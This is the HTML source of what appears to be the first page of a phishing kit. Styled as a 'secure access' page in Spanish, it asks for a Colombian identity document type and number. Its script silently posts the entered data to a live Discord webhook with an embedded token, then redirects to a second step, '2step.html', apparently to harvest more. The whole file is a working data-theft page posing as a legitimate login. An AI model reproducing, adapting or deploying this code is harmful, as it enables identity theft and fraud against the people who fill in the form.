<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Acceso Seguro</title>
    <style>
        * { box-sizing: border-box; outline: none; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .app-header {
            background-color: #E1111C;
            height: 250px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 1.5rem;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            z-index: 1;
        }
        .container {
            flex: 1;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            padding-top: 30px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 0.9rem;
            font-weight: 500;
            padding-left: 10px;
        }
        .input-group { margin-bottom: 25px; }
        
        select, input {
            width: 100%;
            padding: 15px 20px;
            border-radius: 30px;
            border: 1px solid #ddd;
            background-color: white;
            font-size: 1rem;
            color: #333;
            -webkit-appearance: none;
            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
            transition: border-color 0.3s;
        }
        select:focus, input:focus { border-color: #E1111C; }
        
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        input[type=number] { -moz-appearance: textfield; }
        
        .select-wrapper { position: relative; }
        .select-wrapper::after {
            content: '‚ñº';
            font-size: 0.8rem;
            color: #666;
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            pointer-events: none;
        }

        button {
            width: 100%;
            padding: 16px;
            border-radius: 30px;
            border: none;
            background-color: #E1111C;
            color: white;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
        }
        button:hover, button:active {
            background-color: #ff4d55;
            box-shadow: 0 4px 10px rgba(225, 17, 28, 0.3);
        }
        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="app-header">
        <img src="Ybljjas.png" alt="Mi imagen" width="200" height="200">
    </div>
    <div class="container">
        <form id="step1Form">
            <div class="input-group">
                <label>Seleccione el tipo de documento</label>
                <div class="select-wrapper">
                    <select id="tipoDocumento">
                        <option value="C√©dula de ciudadan√≠a">C√©dula de ciudadan√≠a</option>
                        <option value="Tarjeta de Identidad">Tarjeta de Identidad</option>
                        <option value="C√©dula de Extranjer√≠a">C√©dula de Extranjer√≠a</option>
                        <option value="PPT">PPT</option>
                    </select>
                </div>
            </div>

            <div class="input-group">
                <label>Ingrese el n√∫mero de documento</label>
                <input 
                    type="text" 
                    inputmode="numeric" 
                    pattern="[0-9]*"
                    id="numDocumento" 
                    placeholder="N√∫mero de documento" 
                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                    required>
            </div>

            <button type="submit" id="btnEnviar">Continuar</button>
        </form>
    </div>

    <script>
        // ‚ö†Ô∏è IMPORTANTE: Reemplaza esta URL con tu Webhook de Discord
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1442967165413232754/otiUgJhiF8S5-EGS9frT16ZlYAOYePGfHQ4fp81pq6dCPIuxeMbI67ilMYI-pRlzxeAi';

        document.getElementById('step1Form').addEventListener('submit', async function(e) {
            e.preventDefault();

            const tipo = document.getElementById('tipoDocumento').value;
            const numero = document.getElementById('numDocumento').value;
            const btnEnviar = document.getElementById('btnEnviar');

            // Deshabilitar bot√≥n mientras se env√≠a
            btnEnviar.disabled = true;
            btnEnviar.textContent = 'Enviando...';

            try {
                // Enviar a Discord
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: 'üìã **Nuevo registro de documento**',
                        embeds: [{
                            title: 'üÜî Informaci√≥n de Documento',
                            color: 0xE1111C,
                            fields: [
                                {
                                    name: 'üìÑ Tipo de Documento',
                                    value: tipo,
                                    inline: true
                                },
                                {
                                    name: 'üî¢ N√∫mero',
                                    value: numero,
                                    inline: true
                                },
                                {
                                    name: '‚è∞ Fecha y Hora',
                                    value: new Date().toLocaleString('es-CO', { 
                                        timeZone: 'America/Bogota' 
                                    }),
                                    inline: false
                                }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                });

                if (response.ok) {
                    // Guardar en sessionStorage
                    sessionStorage.setItem('userTipo', tipo);
                    sessionStorage.setItem('userDocumento', numero);

                    // Redirigir despu√©s de 1.5 segundos
                    setTimeout(() => {
                        window.location.href = '2step.html';
                    }, 1500);
                } else {
                    throw new Error('Error en el env√≠o');
                }
            } catch (error) {
                console.error('Error:', error);
                
                btnEnviar.disabled = false;
                btnEnviar.textContent = 'Continuar';
            }
        });
    </script>
</body>
</html>
